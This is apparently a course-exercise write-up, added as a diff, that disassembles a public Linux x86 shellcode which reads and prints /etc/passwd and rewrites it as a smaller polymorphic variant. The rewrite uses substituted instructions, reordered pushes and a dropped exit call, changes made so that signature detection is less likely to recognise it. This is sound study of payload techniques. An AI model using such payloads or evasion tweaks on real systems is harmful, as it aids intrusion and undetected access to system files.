@@ -1,0 +1,79 @@
+Original shellcode: 
+http://shell-storm.org/shellcode/files/shellcode-842.php
+
+*Geyslan*'s shellcode is simple, but effective. It opens up /etc/passwd, reads 4096 bytes from the file onto the stack and prints it out on the screen.
+
+For my basic assembly skills, the code looks elegant with little room for optimalization. Thanks to the relocatable and alternative instructions, we can modify the shellcode without expanding the original length of 51 bytes.
+
+Disassembled:
+    xor  ecx, ecx
+    mul  ecx
+    mov  al, 5
+    push ecx
+    push 0x64777373 ; 'sswd'
+    push 0x61702f63 ; 'c/pa'
+    push 0x74652f2f ; '//et'
+    mov  ebx, esp
+    int  0x80
+    xchg eax, ebx
+    xchg eax, ecx
+    mov  al, 3
+    xor  edx, edx
+    mov  dx, 0xfff
+    inc  edx
+    int  0x80
+    xchg eax, edx
+    xor  eax, eax
+    mov  al, 4
+    mov  bl, 1
+    int  0x80
+    xchg eax, ebx
+    int  0x80
+
+    fuzboxz@napalm:~/Learning/SLAE$ ./_shellskeleton
+    Shellcode Lenth: 51
+
+The first thing that's easy to do is replace all the xor register, register instructions with sub. The effect of this instruction for our purposes is the same, but makes the original shellcode less recognizable.
+
+Another trick to spice up things is to rearrange the slash padding in the command string. It's a small change, but makes the payload a bit different. 
+
+One more trick to save some space and change the shellcode a bit is to leave out the graceful SYS_EXIT syscall. While this makes the program exit with SEGFAULT, the payload still executes and we save 3 bytes, lowering the original size of 51 to 48 bytes.
+
+Polymorphic:
+    ; different null instruction
+    sub  ecx, ecx
+    mul  ecx
+    push ecx
+
+    ; command slash padding reorganized
+    push 0x64777373 ; 'sswd'
+    push 0x61702f2f ; '//pa'
+    push 0x6374652f ; '/etc'
+    mov  ebx, esp
+    ; rearanged order of instructions
+    mov  al, 5
+    int  0x80 ; SYS_OPEN
+
+    xchg eax, ebx
+    xchg eax, ecx
+    mov  al, 3
+
+    ; different null instruction
+    sub  edx, edx
+    mov  dx, 0xfff
+    inc  edx
+    int  0x80 ; SYS_READ
+
+    xchg eax, edx
+    ; different null instruction
+    sub  eax, eax
+    mov  bl, 1
+    mov  al, 4
+    int  0x80 ; SYS_WRITE
+
+    ; Shellcode executes without SYS_EXIT 
+    ;xchg eax, ebx
+    ;int  0x80 
+
+    fuzboxz@napalm:~/Learning/SLAE$ ./_shellskeleton
+    Shellcode Lenth: 48
